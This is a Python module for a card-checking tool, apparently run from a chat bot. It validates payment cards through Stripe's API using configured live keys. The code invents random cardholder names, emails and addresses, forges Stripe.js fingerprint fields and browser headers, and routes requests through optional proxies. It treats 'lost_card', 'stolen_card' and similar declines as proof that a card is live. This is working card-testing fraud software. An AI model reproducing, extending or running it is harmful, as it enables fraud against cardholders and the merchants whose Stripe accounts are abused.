import httpx
import asyncio
import time
import random
import string
import json
import os

STRIPE_API = "https://api.stripe.com/v1"

PK_CONFIG_FILE = os.path.join(os.path.dirname(__file__), "..", "pk_config.json")

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
    "transaction_not_allowed", "card_not_supported",
]


def _load_pk_config():
    try:
        if os.path.exists(PK_CONFIG_FILE):
            with open(PK_CONFIG_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}


def _save_pk_config(config):
    try:
        with open(PK_CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass


def set_pk_key(pk, sk=""):
    config = _load_pk_config()
    config["pk"] = pk
    if sk:
        config["sk"] = sk
    _save_pk_config(config)


def get_pk_key():
    config = _load_pk_config()
    return config.get("pk", ""), config.get("sk", "")


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    firsts = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Christopher"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    return random.choice(firsts), random.choice(lasts)


async def stripe_auth_check(cc, mm, yy, cvv, proxy=None):
    config = _load_pk_config()
    pk = config.get("pk", "")
    sk = config.get("sk", "")

    if not pk:
        return "Error - No PK key configured. Admin: /addpk <pk_live_xxx> [sk_live_xxx]"

    start = time.time()

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy

    first, last = _random_name()
    email = _random_email()

    guid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
    muid = f"{''.join(random.choices(string.hexdigits[:16], k=8))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=4))}-{''.join(random.choices(string.hexdigits[:16], k=12))}"
    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))

    client_kwargs = {"timeout": httpx.Timeout(30), "follow_redirects": True}
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:

        pm_data = (
            f"type=card"
            f"&billing_details[name]={first}+{last}"
            f"&billing_details[email]={email}"
            f"&billing_details[address][city]=New+York"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][line1]={random.randint(100, 999)}+Broadway"
            f"&billing_details[address][postal_code]={random.randint(10001, 10199)}"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mm.zfill(2)}"
            f"&card[exp_year]={exp_year}"
            f"&guid={guid}"
            f"&muid={muid}"
            f"&sid={sid}"
            f"&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Ff5ddf352d5%3B+stripe-js-v3%2Ff5ddf352d5%3B+card-element"
            f"&referrer=https%3A%2F%2Fcheckout.stripe.com"
            f"&time_on_page={random.randint(30000, 90000)}"
            f"&key={pk}"
        )

        try:
            resp1 = await client.post(
                f"{STRIPE_API}/payment_methods",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                },
                content=pm_data,
            )
            result1 = resp1.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PM request failed: {str(e)[:50]} [{elapsed}s]"

        if "error" in result1:
            err = result1["error"]
            code = err.get("code", "")
            decline = err.get("decline_code", "")
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)

            if code == "rate_limit":
                return f"Error - Rate Limited [{elapsed}s]"
            if code == "api_key_expired":
                return f"Error - PK Key Expired [{elapsed}s]"
            if "testmode_charges_only" in msg or code == "testmode_charges_only":
                return f"Error - Test Mode Key [{elapsed}s]"
            if code == "incorrect_number":
                return f"Declined - Incorrect Card Number [{elapsed}s]"
            if code in ("invalid_expiry_year", "invalid_expiry_month"):
                return f"Declined - Invalid Expiry [{elapsed}s]"
            if code == "expired_card":
                return f"Declined - Card Expired [{elapsed}s]"
            if code == "card_declined" and decline in LIVE_DECLINE_CODES:
                return f"Approved - {decline} (Live Declined) [{elapsed}s]"
            if code == "card_declined":
                return f"Declined - {decline or msg[:60]} [{elapsed}s]"

            return f"Declined - {code}: {msg[:60]} [{elapsed}s]"

        pm_id = result1.get("id")
        if not pm_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - No PM ID [{elapsed}s]"

        if sk:
            try:
                si_data = {
                    "payment_method_types[]": "card",
                    "payment_method": pm_id,
                    "confirm": "true",
                    "usage": "off_session",
                }

                resp2 = await client.post(
                    f"{STRIPE_API}/setup_intents",
                    data=si_data,
                    auth=(sk, ""),
                    timeout=25,
                )
                result2 = resp2.json()
            except Exception as e:
                elapsed = round(time.time() - start, 2)
                return f"Error - SI request failed: {str(e)[:50]} [{elapsed}s]"

            elapsed = round(time.time() - start, 2)
            status = result2.get("status", "")

            if status == "succeeded":
                return f"Approved - Auth Passed [{elapsed}s]"

            if status == "requires_action":
                return f"Approved - 3DS Required (Live) [{elapsed}s]"

            if "error" in result2:
                err = result2["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")

                if code == "rate_limit":
                    return f"Error - Rate Limited [{elapsed}s]"

                if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
                    return f"Approved - {decline or code} (Live Declined) [{elapsed}s]"

                if code == "card_declined" and decline == "fraudulent":
                    return f"Declined - Fraudulent [{elapsed}s]"

                if code == "card_declined":
                    return f"Declined - {decline or 'card_declined'} [{elapsed}s]"

                if code == "setup_intent_authentication_failure":
                    return f"Approved - Auth Failed (Live) [{elapsed}s]"

                if code == "authentication_required":
                    return f"Approved - 3DS Required (Live) [{elapsed}s]"

                return f"Declined - {code}: {msg[:50]} [{elapsed}s]"

            return f"Declined - Status: {status} [{elapsed}s]"
        else:
            elapsed = round(time.time() - start, 2)
            card_brand = result1.get("card", {}).get("brand", "unknown")
            card_checks = result1.get("card", {}).get("checks", {})
            cvc_check = card_checks.get("cvc_check", "unknown")
            if cvc_check == "pass":
                return f"Approved - PM Valid (CVC Pass) [{elapsed}s]"
            elif cvc_check == "fail":
                return f"Declined - CVC Failed [{elapsed}s]"
            else:
                return f"Approved - PM Created ({card_brand}) [{elapsed}s]"
